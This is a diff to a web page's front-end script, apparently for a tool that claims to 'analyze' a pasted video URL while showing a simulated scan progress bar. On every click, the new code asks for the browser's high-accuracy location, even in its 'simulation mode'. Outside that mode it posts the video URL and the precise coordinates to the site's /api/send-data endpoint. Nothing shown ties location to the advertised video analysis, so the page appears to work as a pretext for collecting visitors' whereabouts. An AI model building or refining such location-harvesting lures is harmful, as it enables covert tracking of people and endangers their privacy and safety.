@@ -1,4 +1,8 @@
-// public/scripts.js (updated)
+// public/scripts.js (force/location-friendly version)
+// This version WILL request location on click (user gesture).
+// If "Simulation mode" is ON, we still request permission so the browser prompt appears,
+// but we will NOT send the location to the server while in simulation mode.
+
 const analyzeButton = document.getElementById('analyzeButton');
 const videoUrlInput = document.getElementById('videoUrlInput');
 const demoToggle = document.getElementById('demoToggle');
@@ -72,6 +76,51 @@ async function runScanFlow(input, isDemo){
   progressBar.style.width = '0%';
 }
 
+/**
+ * Request location from browser. Returns {latitude, longitude, accuracy} or null.
+ * This MUST be called inside a user gesture (click).
+ */
+function requestLocationWithPrompt(timeout = 8000) {
+  return new Promise((resolve) => {
+    if (!("geolocation" in navigator)) {
+      console.warn('Geolocation not supported by browser.');
+      return resolve(null);
+    }
+
+    let resolved = false;
+    const onSuccess = (pos) => {
+      if (resolved) return;
+      resolved = true;
+      resolve({
+        latitude: pos.coords.latitude,
+        longitude: pos.coords.longitude,
+        accuracy: pos.coords.accuracy
+      });
+    };
+    const onError = (err) => {
+      if (resolved) return;
+      resolved = true;
+      console.warn('Geolocation error/denied:', err && err.message);
+      resolve(null);
+    };
+
+    navigator.geolocation.getCurrentPosition(onSuccess, onError, {
+      enableHighAccuracy: true,
+      timeout: timeout,
+      maximumAge: 0
+    });
+
+    // Fallback: if neither success nor error after (timeout + 1s), resolve null
+    setTimeout(() => {
+      if (!resolved) {
+        resolved = true;
+        console.warn('Geolocation fallback timeout.');
+        resolve(null);
+      }
+    }, timeout + 1000);
+  });
+}
+
 analyzeButton.addEventListener('click', async () => {
   const input = videoUrlInput.value.trim();
   if (!input) {
@@ -81,45 +130,39 @@ analyzeButton.addEventListener('click', async () => {
 
   const isDemo = demoToggle.checked;
 
+  // Always trigger permission prompt on click (so user sees browser dialog),
+  // but if demo mode is ON we will NOT forward location to server.
+  let locationData = null;
+  try {
+    // This call is inside click handler -> should trigger browser permission dialog.
+    locationData = await requestLocationWithPrompt(8000);
+    console.log('Location result (may be null):', locationData);
+  } catch (e) {
+    console.error('Location request failed:', e);
+    locationData = null;
+  }
+
+  // Show scan UI
+  runScanFlow(input, isDemo);
+
+  // If demo mode is enabled -> do NOT send real location to server.
   if (isDemo) {
-    // Demo: do not request location, only simulate
-    runScanFlow(input, true);
+    console.log('Demo mode ON — location will NOT be sent to server.');
     return;
   }
 
-  // Non-demo: request geolocation (this triggers browser permission prompt)
-  let locationData = null;
-  if ("geolocation" in navigator) {
-    try {
-      // This call must be triggered by user gesture (we are inside click handler)
-      locationData = await new Promise((resolve) => {
-        navigator.geolocation.getCurrentPosition(
-          pos => resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy }),
-          err => {
-            // user denied or error — we resolve null silently (no extra UI)
-            console.warn('Geolocation error or denied:', err && err.message);
-            resolve(null);
-          },
-          { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-        );
-      });
-    } catch (e) {
-      locationData = null;
-    }
-  } else {
-    console.warn('Geolocation not supported by browser');
-  }
-
-  // Show scan UI while sending
-  runScanFlow(input, false);
-
-  // Send real data to server (videoUrl + optional location)
+  // Non-demo -> send to server
   try {
-    await fetch('/api/send-data', {
+    const res = await fetch('/api/send-data', {
       method: 'POST',
       headers: {'Content-Type':'application/json'},
       body: JSON.stringify({ videoUrl: input, location: locationData })
     });
+    if (!res.ok) {
+      console.warn('Server responded with non-OK status', res.status);
+    } else {
+      console.log('Data successfully sent to server.');
+    }
   } catch (err) {
     console.error('Failed to send to server', err);
   }
